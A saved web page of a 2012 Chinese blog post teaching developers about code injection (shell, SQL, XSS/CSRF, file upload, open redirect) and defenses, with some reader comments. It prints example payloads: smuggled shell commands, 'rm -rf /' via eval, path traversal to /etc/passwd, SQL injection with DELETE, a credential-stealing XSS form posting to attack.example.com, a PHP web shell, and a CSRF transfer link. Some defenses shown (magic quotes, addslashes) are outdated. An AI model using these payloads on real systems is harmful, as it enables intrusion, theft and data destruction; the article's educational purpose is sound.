@@ -1,0 +1,438 @@
+<!DOCTYPE html><!--[if IE 8]>
+<html id="ie8" dir="ltr" lang="zh-CN"
+	prefix="og: https://ogp.me/ns#" >
+<![endif]--><!--[if !(IE 8) ]><!--><html dir="ltr" lang="zh-CN" prefix="og: https://ogp.me/ns#"><!--<![endif]--><head><meta charset="UTF-8"/><title>程序员疫苗：代码注入 | 酷 壳 - CoolShell</title><link rel="stylesheet" type="text/css" href="/assets/all.min.css"/><link rel="shortcut icon" href="/assets/favicon.png"/></head>
+<body class="post-template-default single single-post postid-8711 single-format-standard group-blog">
+
+<div id="page" class="hfeed site">
+
+<div class="container">
+<div class="row">
+
+</div>
+</div>
+<div id="content" class="site-content">
+<div class="container">
+<div class="row">
+<div id="primary" class="content-area  col-md-12" style="margin-top: 40px;">
+<main id="main" role="main">
+<article id="post-8711" class="post-content post-8711 post type-post status-publish format-standard hentry category-webdev category-netsecurity tag-crsf tag-sql tag-web tag-xss tag-318">
+<header class="entry-header">
+<span class="screen-reader-text">程序员疫苗：代码注入</span>
+<h1 class="entry-title">程序员疫苗：代码注入</h1>
+<div class="entry-meta">
+<h5 class="entry-date"><i class="fa fa-calendar-o"></i> <a href="/articles/8711.html" title="08:34" rel="bookmark"><time class="entry-date" datetime="2012-12-10T08:34:48+08:00" pubdate="">2012年12月10日 </time></a><span class="byline"><span class="sep"></span><i class="fa fa-user"></i>
+<span class="author vcard"><a class="url fn n" href="/articles/author/haoel" title="View all posts by 陈皓" rel="author">陈皓</a></span></span> <i class="fa fa-comments-o"></i><span class="screen-reader-text">评论 </span> <a href="/articles/8711.html#comments" class="comments-link">63 条评论</a> <i class="fa fa-users" style="margin-left:10px;"></i> 73,046 人阅读</h5>
+</div>
+</header>
+<div class="entry-content">
+<p><img decoding="async" class="alignright  wp-image-8730" title="程序员疫苗" src="/uploads/2012/12/200906020837401710.jpg" alt="" width="245" height="206" srcset="" sizes="(max-width: 245px) 100vw, 245px"/>几个月在<a href="http://weibo.com/haeol" target="_blank">我的微博</a>上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。很多程序上错误就像人类世界的病毒一样，我们应该给我们的新入行的程序员注射一些疫苗，就像给新生儿打疫苗一样，希望程序员从入行时就对这些错误有抵抗力。</p>
+<p>我的那个疫苗网站正在建议中（不好意思拖了很久），不过，我可以先写一些关于程序员疫苗性质的文章，也算是热热身。希望大家喜欢，先向大家介绍第一注疫苗——代码注入。</p>
+<div id="ez-toc-container" class="ez-toc-v2_0_48 counter-hierarchy ez-toc-counter ez-toc-grey ez-toc-container-direction">
+<div class="ez-toc-title-container">
+<p class="ez-toc-title">目录</p>
+<span class="ez-toc-title-toggle"></span></div>
+<nav><ul class="ez-toc-list ez-toc-list-level-1 "><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Shell%E6%B3%A8%E5%85%A5" title="Shell注入">Shell注入</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#SQL%E6%B3%A8%E5%85%A5" title="SQL注入">SQL注入</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8_%E5%85%A5" title="跨网站脚本注 入">跨网站脚本注 入</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6" title="上传文件">上传文件</a></li><li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#URL%E8%B7%B3%E8%BD%AC" title="URL跳转">URL跳转</a></li></ul></nav></div>
+<h4><span class="ez-toc-section" id="Shell%E6%B3%A8%E5%85%A5"></span>Shell注入<span class="ez-toc-section-end"></span></h4>
+<p>我们先来看一段perl的代码：</p>
+<p>[perl]use CGI qw(:standard);<br/>
+$name = param(‘name’);<br/>
+$nslookup = &#34;/path/to/nslookup&#34;;<br/>
+print header;<br/>
+if (open($fh, &#34;$nslookup $name|&#34;)) {<br/>
+  while (&lt;$fh&gt;) {<br/>
+print escapeHTML($_);<br/>
+print &#34;&lt;br&gt;\n&#34;;<br/>
+}<br/>
+close($fh);<br/>
+}[/perl]</p>
+<p>如果用户输入的参数是：</p>
+<p><code data-enlighter-language="shell" class="EnlighterJSRAW">coolshell.cn%20%3B%20/bin/ls%20-l</code></p>
+<p>那么，这段perl的程序就成了：</p>
+<p><span id="more-8711"></span></p>
+<p><code data-enlighter-language="shell" class="EnlighterJSRAW">/path/to/nslookup coolshell.cn ; /bin/ls -l</code></p>
+<p>我们再来看一段PHP的程序：</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">$myvar = &#39;somevalue&#39;;
+$x = $_GET[&#39;arg&#39;];
+eval(&#39;$myvar = &#39; . $x . &#39;;&#39;);</pre>
+<p>“<code>eval</code>“的参数将会视同PHP处理，所以额外的命令可被添加。例如：如果”arg”如果被设成”<code>10; system(&#39;rm -rf /&#39;)</code>“，后面的”<code>system(&#39;rm -rf /&#39;)</code>“代码将被运行，这等同在服务器上运行开发者意料外的程序。（关于rm -rf /，你懂的，可参看“<a title="一个空格引发的惨剧" href="/articles/4875.html" target="_blank">一个空格引发的悲剧</a>”）</p>
+<p>再来看一个PHP的代码</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">$isadmin= false;
+...
+...
+foreach ($_GET as $key =&gt; $value) {
+  $$key = $value;
+}</pre>
+<p>如果攻击者在查询字符串中给定”isadmin=1″，那$isadmin将会被设为值 “1”，然后攻击值就取得了网站应用的admin权限了。</p>
+<p>再来看一个PHP的示例：</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">$action = &#39;login&#39;;
+   if (__isset( $_GET[&#39;act&#39;] ) )
+      $action = $_GET[&#39;act&#39;];
+   require( $action . &#39;.php&#39; ); </pre>
+<p>这个代码相当危险，攻击者有可能可以干这些事：</p>
+<ul>
+<li><code>/test.php?act=<strong>http://evil/exploit</strong></code> – 注入远程机器上有漏洞的文件。</li>
+<li><code>/test.php?act=<strong>/home/www/bbs/upload/exploit</strong></code> – 从一个已经上载、叫做exploit.php文件运行其代码。</li>
+<li><code>/test.php?act=<strong>../../../../etc/passwd%00</strong></code> – 让攻击者取得该UNIX系统目录检索下密码文件的内容。一个使用空元字符以解除<code>.php</code>扩展名限制，允许访问其他非 .php 结尾文件。 (PHP默认值”magic_quotes_gpc = On”可以终止这种攻击)</li>
+</ul>
+<p>这样的示例有很多，只要你的程序有诸如：<code>system()</code>、<code>StartProcess()</code>、<code>java.lang.Runtime.exec()</code>、<code>System.Diagnostics.Process.Start()</code>以及类似的应用程序接口，都是比较危险的，最好不要让其中的字符串去拼装用户的输入。</p>
+<p>PHP提供<code><a href="http://www.php.net/manual/en/function.escapeshellarg.php" rel="nofollow">escapeshellarg()</a></code>和<code><a href="http://www.php.net/manual/en/function.escapeshellcmd.php" rel="nofollow">escapeshellcmd()</a></code>以在调用方法以前进行编码。然而，实际上并不建议相信这些方法是安全的 。</p>
+<h4><span class="ez-toc-section" id="SQL%E6%B3%A8%E5%85%A5"></span>SQL注入<span class="ez-toc-section-end"></span></h4>
+<p>SQL injection，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏。</p>
+<p>在应用程序中若有下列状况，则可能应用程序正暴露在SQL Injection的高风险情况下：</p>
+<ol>
+<li>在应用程序中使用字符串联结方式组合SQL指令（如：引号没有转义）。</li>
+<li>在应用程序链接数据库时使用权限过大的帐户（如：很多开发人员都喜欢用sa（最高权限的系统管理员帐户）连接Microsoft SQL Server数据库）。</li>
+<li>在数据库中开放了不必要但权力过大的功能（例如在Microsoft SQL Server数据库中的xp_cmdshell延伸预存程序或是OLE Automation预存程序等）</li>
+<li>过于信任用户所输入的数据，未限制输入的字符数，以及未对用户输入的数据做潜在指令的检查。</li>
+</ol>
+<p>例程：</p>
+<p>某个网站的登录验证的SQL查询代码为</p>
+<div dir="ltr">
+<div>
+<pre data-enlighter-language="sql" class="EnlighterJSRAW">strSQL = &#34;SELECT * FROM users
+WHERE (name = &#39;&#34; + userName + &#34;&#39;) and (pw = &#39;&#34;+ passWord +&#34;&#39;);&#34;</pre>
+</div>
+</div>
+<p>用户在登录时恶意输入如下的的用户名和口令：</p>
+<div dir="ltr">
+<div><code data-enlighter-language="sql" class="EnlighterJSRAW">userName = &#34;&#39; OR &#39;1&#39;=&#39;1&#34;;</code><p></p>
+</div>
+</div>
+<div dir="ltr">
+<div><code data-enlighter-language="sql" class="EnlighterJSRAW">passWord = &#34;&#39; OR &#39;1&#39;=&#39;1&#34;;</code><p></p>
+</div>
+</div>
+<p>此时，将导致原本的SQL字符串被解析为：</p>
+<div dir="ltr">
+<div>
+<pre data-enlighter-language="sql" class="EnlighterJSRAW">strSQL = &#34;SELECT * FROM users
+WHERE (name = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;) and (pw = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;);&#34;</pre>
+</div>
+</div>
+<p>也就是实际上运行的SQL命令会变成下面这样的，因此导致无帐号密码，也可登录网站。</p>
+<div dir="ltr">
+<div><code data-enlighter-language="sql" class="EnlighterJSRAW">strSQL = &#34;SELECT * FROM users;&#34;</code><p></p>
+</div>
+</div>
+<p>这还不算恶劣的，真正恶劣的是在你的语句后再加一个自己的语句，如：</p>
+<p><code data-enlighter-language="sql" class="EnlighterJSRAW">username= &#34;&#39; ; DELETE FROM users; --&#34;;</code></p>
+<p>这样一来，要么整个数据库的表被人盗走，要么被数据库被删除。</p>
+<p><strong>所以SQL注入攻击被俗称为黑客的填空游戏</strong>。你是否还记得酷壳<a title="千万别惹程序员" href="/articles/6639.html" target="_blank">这篇文章里的SQL注入</a>？</p>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="SQL-injection-attack(adjusted)" src="https://coolshell.cn//wp-content/uploads/2012/02/SQL-injection-attackadjusted.jpg" alt="" width="600" height="407"/></p>
+<p>当他们发现一个网站有SQL注入的时候，他们一般会干下面的事：</p>
+<ul>
+<li>盗取数据表中的数据，例如个人机密数据（信用卡，身份证，手机号，通讯录……），帐户数据，密码等，获得用户的数据和信息后对这些用户进行“社会工程学”活动（如：<a title="为什么不能用微信或米聊这类的软件" href="/articles/8638.html" target="_blank">我前两天在微信上亲身经历</a>）。</li>
+</ul>
+<ul>
+<li>取得系统管理员权限（例如ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。</li>
+</ul>
+<ul>
+<li>在数据库中的数据中插入一些HTML/JS代码，有可能得以在网页加入恶意链接以及XSS，这样一来就让访问者被黑。</li>
+</ul>
+<ul>
+<li>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如：MS SQL Server的 xp_cmdshell “net stop iisadmin”可停止服务器的IIS服务）。甚至破坏硬盘数据，瘫痪全系统（例如xp_cmdshell “FORMAT C:”）。</li>
+</ul>
+<div>现在的黑客比较坏，瘫痪系统的事，他们干的越来越少，因为没什么利益，他们希望通过获取用户的帐号信息后，转而攻击用户别的帐号，如游戏帐号，网银帐号，QQ帐号等等他们可以获利的事情（这就是为什么我希望大家<a title="如何管理并设计你的口令" href="/articles/2428.html" target="_blank">在不站点上使用不同的口令</a>，甚至不同的用户信息的原因）</div>
+<p><strong>如何避免</strong></p>
+<ul>
+<li>在组合SQL字符串时，先针对所传入的参数作字符转义（如：将单引号字符取代为连续2个单引号字符）。如果使用PHP开发网页程序的话，亦可打开PHP的Magic quote功能自动将所有的网页传入参数，将单引号字符取代为连续2个单引号字符。<strong>如果可能应该过滤以下字符：分号“;”，两个减号“–”，单引号“’”，注释“/* … */”</strong>。（当然，因为注入攻击一般用闭合的引号来玩，所以把引号转义了应该就没有什么问题了）</li>
+</ul>
+<ul>
+<li>更换危险字符。例如在PHP通过<code>addslashes()</code>函数保护SQL注入。</li>
+</ul>
+<ul>
+<li>限制用户输入的长度，限制用户输入的取值范围。</li>
+</ul>
+<ul>
+<li>为当前应用建立权限比较小的数据库用户，这样不会导致数据库管理员丢失。</li>
+</ul>
+<ul>
+<li>把数据库操作封装成一个Service，对于敏感数据，对于每个客户端的IP，在一定时间内每次只返回一条记录。这样可以避免被拖库。</li>
+</ul>
+<h4></h4>
+<h4><span class="ez-toc-section" id="%E8%B7%A8%E7%BD%91%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8_%E5%85%A5"></span>跨网站脚本注 入<span class="ez-toc-section-end"></span></h4>
+<p><strong>跨网站脚本</strong>（<strong>Cross-site</strong> scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+<p>假如我们有这样一段PHP的代码：</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">$username = $_GET[&#39;username&#39;];
+echo &#39;&lt;div&gt; Welcome, &#39; . $username . &#39;&lt;/div&gt;&#39;;</pre>
+<p>那么我们可以这样来注入：</p>
+<div style="color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;Script Language=”Javascript”&gt;alert(“You’ve been attacked!”);&lt;/Script&gt;</div>
+<p>甚至这样：</p>
+<div style="color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;div id=”stealPassword”&gt;Please Login:&lt;form name=”input” action=”http://attack.example.com/stealPassword.php” method=”post”&gt;Username: &lt;input type=”text” name=”username” /&gt;&lt;br/&gt;Password: &lt;input type=”password” name=”password” /&gt;&lt;input type=”submit” value=”Login” /&gt;&lt;/form&gt;&lt;/div&gt;</div>
+<p>这会让网页显示以下内容：</p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;div class=&#34;header&#34;&gt; Welcome,
+    &lt;div id=&#34;stealPassword&#34;&gt;Please Login:
+        &lt;form name=&#34;input&#34; action=&#34;attack.example.com/stealPassword.php&#34; method=&#34;post&#34;&gt;
+            Username: &lt;input type=&#34;text&#34; name=&#34;username&#34; /&gt;
+            &lt;br/&gt;
+            Password: &lt;input type=&#34;password&#34; name=&#34;password&#34; /&gt;
+            &lt;input type=&#34;submit&#34; value=&#34;Login&#34; /&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+</pre>
+<p>注入的代码还有可能变种为如下这种更为隐蔽的方式(unicode码)：</p>
+<div style="color: #1b00aa; background-color: #efefef; border: 1px solid #DDE2F5; font-size: 90%; padding: 10px;">
+<div>trustedSite.example.com/welcome.php?username=&lt;script+type=”text/javascript”&gt;</div>
+<div>document.write(‘\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073</div>
+<div>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064</div>
+<div>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067</div>
+<div>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D</div>
+<div>\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063</div>
+<div>\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F</div>
+<div>\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D</div>
+<div>\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061</div>
+<div>\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068</div>
+<div>\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070</div>
+<div>\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D</div>
+<div>\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079</div>
+<div>\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061</div>
+<div>\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065</div>
+<div>\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073</div>
+<div>\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075</div>
+<div>\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073</div>
+<div>\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022</div>
+<div>\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E</div>
+<div>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D</div>
+<div>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C</div>
+<div>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F</div>
+<div>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D’);&lt;/script&gt;</div>
+</div>
+<p><strong>XSS的攻击主要是通过一段JS程序得用用户已登录的cookie去模拟用户的操作（甚至偷用户的cookie）</strong>。这个方式可以让用户在自己不知情的情况下操作了自己不期望的操作。如果是网站的管理员中招，还有可能导致后台管理权限被盗。关于其中的一些细节可以参看《<a title="新浪微博的XSS攻击" href="/articles/4914.html" target="_blank">新浪微博的XSS攻击</a>》一文。XSS攻击是程序员有一糊涂就很容易犯的错误，你还可以看看网上的《<a href="http://www.cnblogs.com/kingthy/archive/2011/08/20/2147355.html" target="_blank">腾讯微博的XSS攻击</a>》。</p>
+<p>XSS攻击在论坛的用户签档里面（使用img标签）也发生过很多次，包括像一些使用bcode的网站，很有可能会被注入一些可以被浏览器用来执行的代码。包括CSS都有可能被注入javascript代码。</p>
+<p>不要以为XSS攻击是我们的程序没有写好，有时候，我们会引用别人站点上的js文件，比如：放一个天气预报的小Widget的js，或是一个流量监控，或是一段广告的js文件。你不知道这些东西是不是有问题，如果有恶意的话，这就是你自己主动注入攻击代码了。</p>
+<p><strong>另外，XSS攻击有一部分是和浏览器有关的。</strong>比如，如下的一些例子，你可能从来都没有想过吧？（<strong>更多的例子可以参看酷壳很早以前的这篇文章《<a href="/articles/2416.html" target="_blank">浏览器HTML安全列表</a>》</strong>）</p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;table background=”javascript:alert(1)”&gt;
+
+&lt;meta charset=”mac-farsi”&gt;¼script¾alert(1)¼/script¾
+
+&lt;img src=”javascript:alert(1)”&gt;</pre>
+<p>XSS攻击通常会引发CSRF攻击。CSRF攻击主要是通过在A站上设置B站点上的链接，通过使用用户在B站点上的登录且还没有过期的cookie，从而使得用户的B站点被攻击。（这得益于现在的多Tab页的浏览器，大家都会同时打开并登录很多的网站，而这些不同网站的页面间的cookie又是共享的）</p>
+<p>于是，如果我在A站点内的某个贴子内注入这么一段代码：</p>
+<p><code data-enlighter-language="html" class="EnlighterJSRAW">&lt;img src=&#34;http://bank.example.com/transfer?account=XXX&amp;amount=1000000&amp;for=haoel&#34;&gt;</code></p>
+<p>很有可能你就在访问A站的这个贴子时，你的网银可能向我转了一些钱。</p>
+<p><strong>如何避免</strong></p>
+<p>要防止XSS攻击，一般来说有下面几种手段：</p>
+<ul>
+<li>严格限制用户的输入。最好不要让用户输入带标签的内容。最好不要让用户使用一些所见即所得的HTML编辑器。</li>
+</ul>
+<ul>
+<li>严格过滤用户的输入。如：
+<ul>
+<li>PHP的<code>htmlentities()或是htmlspecialchars()或是strip_tags()</code>。</li>
+<li>Python的<code>cgi.escape()</code></li>
+<li>ASP的<code>Server.HTMLEncode()</code>。</li>
+<li>Node.js的node-validator。</li>
+<li>Java的<a href="https://code.google.com/p/xssprotect/" rel="nofollow">xssprotect</a>。</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>在一些关键功能，完全不能信任cookie，必需要用户输入口令。如：修改口令，支付，修改电子邮件，查看用户的敏感信息等等。</li>
+</ul>
+<ul>
+<li>限制cookie的过期时间。</li>
+</ul>
+<ul>
+<li>对于CSRF攻击，一是需要检查http的reference header。二是不要使用GET方法来改变数据，三是对于要提交的表单，后台动态生成一个随机的token，这个token是攻击者很难伪造的。（对于token的生成，建议找一些成熟的lib库）</li>
+</ul>
+<p>另外，你可能觉得网站在处理用户的表单提交就行了，其实不是，<strong>想一想那些Web Mail，我可以通过别的服务器向被攻击用户发送有JS代码、图片、Flash的邮件到你的邮箱，你打开一看，你就中招了</strong>。所以，WebMail一般都禁止显示图片和附件，这些都很危险，只有你完全了解来源的情况下才能打开。<strong>电子邮件的SMTP协议太差了，基本上无法校验其它邮件服务器的可信度，我甚至可以自己建一个本机的邮件服务器，想用谁的邮件地址发信就用谁的邮件地址发信</strong>。<span style="color: #cc0000;"><strong>所以，我再次真诚地告诉大家，请用gmail邮箱</strong></span>。别再跟我说什么QQMail之类的好用了。</p>
+<h4><span class="ez-toc-section" id="%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"></span>上传文件<span class="ez-toc-section-end"></span></h4>
+<p>上传文件是一个很危险的功能，尤其是你如果不校验上传文件的类型的话，你可能会中很多很多的招，这种攻击相当狠。<strong>试想，如果用户上传给你一个PHP、ASP、JSP的文件，当有人访问这个文件时，你的服务器会解释执行之，这就相当于他可以在你的服务器上执行一段程序。这无疑是相当危险的。</strong></p>
+<p>举个例子：</p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;form action=&#34;upload_picture.php&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;
+要上传的文件:
+&lt;input type=&#34;file&#34; name=&#34;filename&#34;/&gt;
+&lt;br/&gt;
+&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Submit&#34;/&gt;
+&lt;/form&gt;
+</pre>
+<p> </p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">$target = &#34;pictures/&#34; . basename($_FILES[&#39;uploadedfile&#39;][&#39;name&#39;]);
+if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target)){
+    echo &#34;图片文件上传成功&#34;;
+}else{&lt;/div&gt;
+    echo &#34;图片文件上传失败&#34;;
+}</pre>
+<p>假如我上传了一个PHP文件如下：</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">&lt;?php
+system($_GET[&#39;cmd&#39;]);
+?&gt;</pre>
+<p>那么，我就可以通过如下的URL访问攻击你的网站了：</p>
+<p><code data-enlighter-language="shell" class="EnlighterJSRAW">http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</code></p>
+<p>抵御这样的攻击有两种手段：</p>
+<p>1）限制上传文件的文件扩展名。</p>
+<p>2）千万不要使用root或Administrator来运行你的Web应用。</p>
+<h4><span class="ez-toc-section" id="URL%E8%B7%B3%E8%BD%AC"></span>URL跳转<span class="ez-toc-section-end"></span></h4>
+<p>URL跳转很有可能会成为攻击利用的工具。</p>
+<p>比如下面的PHP代码：</p>
+<pre data-enlighter-language="php" class="EnlighterJSRAW">$redirect_url = $_GET[&#39;url&#39;];
+header(&#34;Location: &#34; . $redirect_url);</pre>
+<p>这样的代码可能很常见，比如当用户在访问你的网站某个页观的时候没有权限，于是你的网站跳转到登录页面，当然登录完成后又跳转回刚才他访问的那个页面。一般来说，我们都会在跳转到登录页面时在URL里加上要被跳转过去的网页。于是会出现上述那样的代码。</p>
+<p>于是我们就可以通过下面的URL，跳转到一个恶意网站上，而那个网站上可能有一段CSRF的代码在等着你，或是一个钓鱼网站。</p>
+<p><code data-enlighter-language="shell" class="EnlighterJSRAW">http://bank.example.com/redirect?url=http://attacker.example.net</code></p>
+<p>这种攻击具有的迷惑性在于，用户看到的http://bank.example.com，<strong>以为是一个合法网站，于是就点了这个链接，结果通过这个合法网站，把用户带到了一个恶意网站，而这个恶意网站上可能把页面做得跟这个合法网站一模一样，你还以为访问的是正确的地方，结果就被钓鱼了</strong>。</p>
+<p>解决这个问题很简单，你需要在你的后台判断一下传过来的URL的域名是不是你自己的域名。</p>
+<p>你可以看看Google和Baidu搜索引擎的链接跳转，百度的跳转链接是被加密过的，而Google的网站链接很长，里面有网站的明文，但是会有几个加密过的参数，如果你把那些参数移除掉，Google会显示一个重定向的提醒页面。（我个人觉得还是Google做得好）</p>
+<p>（本篇文章结束）</p>
+<p>这段时间工作和家里的事比较多，所以时间有限，更新不快，而此篇行文比较仓促，欢迎大家补充，并指出我文中的问题。</p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div id="post-ratings-8711-loading" class="post-ratings-loading"><img src="https://coolshell.cn/wp-content/plugins/wp-postratings/images/loading.gif" width="16" height="16" class="post-ratings-image"/>Loading...</div>
+</div>
+<footer class="entry-footer">
+<hr/><div class="row"><div class="col-md-6 cattegories"><span class="cat-links"><i class="fa fa-folder-open"></i>
+<a href="javascript:void(0)" rel="category tag">Web开发</a>, <a href="javascript:void(0)" rel="category tag">网络安全</a></span></div><div class="col-md-6 tags"><span class="tags-links"><i class="fa fa-tags"></i> <a href="javascript:void(0)" rel="tag">CRSF</a>, <a href="javascript:void(0)" rel="tag">SQL</a>, <a href="javascript:void(0)" rel="tag">Web</a>, <a href="javascript:void(0)" rel="tag">XSS</a>, <a href="javascript:void(0)" rel="tag">安全</a></span></div></div> </footer>
+</article>
+
+<div class="fixed"></div> 
+</main>
+
+<div class="post-comments">
+<div id="comments" class="comments-area">
+<h2 class="comments-title">
+《<span>程序员疫苗：代码注入</span>》的相关评论 </h2>
+<ol class="comment-list">
+<li id="comment-370831" class="trackback even thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://reflectionsymme.sourceforge.net/ploggerb3/?id=183" class="url" rel="ugc external nofollow">will my ex come back test</a> </div>
+</li>
+<li id="comment-542594" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-542594" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/92692511584b078bdfc081ee217a70fb?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/92692511584b078bdfc081ee217a70fb?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">aold619</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/8711.html/comment-page-2#comment-542594"><time datetime="2013-06-12T02:02:49+08:00">2013年06月12日 02:02</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>上学期刚学JDBC的时候就犯过SQL注入的错，后来被老师很批了一次…<br/>
+现在看到这篇文章对注入的问题有了更深的了解，谢谢！</p>
+</div>
+ </article>
+</li>
+<li id="comment-581484" class="pingback even thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://team-dev.tk/?p=97" class="url" rel="ugc external nofollow">程序员疫苗：代码注入(2) | TK开发部学习交流平台</a> </div>
+</li>
+<li id="comment-653596" class="pingback odd alt thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.w3c.com.cn/%e3%80%90%e9%85%b7%e5%a3%b3%e7%83%ad%e6%96%87%e3%80%91%e7%a8%8b%e5%ba%8f%e5%91%98%e7%96%ab%e8%8b%97%ef%bc%9a%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5" class="url" rel="ugc external nofollow">【酷壳热文】程序员疫苗：代码注入 - Sina App Engine - 开发者第964670个问答</a> </div>
+</li>
+<li id="comment-1152228" class="pingback even thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://guanmian.net/?p=1471" class="url" rel="ugc external nofollow">XSS, CSRF, DDoS, SQL Injection and Session Hijacking | Steve Guan</a> </div>
+</li>
+<li id="comment-1179717" class="comment odd alt thread-odd thread-alt depth-1">
+<article id="div-comment-1179717" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/6d2c5e0d943b7e64f157f8425972e640?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/6d2c5e0d943b7e64f157f8425972e640?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://WWW.OMG.COM" class="url" rel="ugc external nofollow">OMG</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/8711.html/comment-page-2#comment-1179717"><time datetime="2014-01-14T20:29:32+08:00">2014年01月14日 20:29</time></a> </div>
+</footer>
+<div class="comment-content">
+<blockquote cite="#commentbody-233930"><p>
+<strong><a href="#comment-233930" rel="nofollow">full_of_bullshit</a> :</strong><br/>
